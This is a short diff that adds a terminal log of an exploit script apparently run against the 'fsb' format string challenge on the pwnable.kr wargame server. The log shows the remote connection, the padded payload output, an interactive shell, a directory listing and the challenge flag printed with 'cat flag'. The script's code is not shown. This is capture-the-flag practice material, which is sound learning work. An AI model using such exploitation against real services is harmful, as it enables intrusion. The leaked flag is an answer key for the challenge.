@@ -1,0 +1,12 @@
+root@MiWiFi-R3-srv:~/Desktop/Pwn/pwnable.kr# python fsb.py 
+[+] Connecting to pwnable.kr on port 2222: Done
+[!] Couldn't check security settings on 'pwnable.kr'
+[+] Starting remote process './fsb' on pwnable.kr: pid 6854
+[*] Switching to interactive mode
+Give me some format strings(1)
+0000000000......00000000000(about 200+MB of '0')
+$ $ ls
+flag  fsb  fsb.c
+$ $ cat flag
+Have you ever saw an example of utilizing [n] format character?? :(
+$ $  
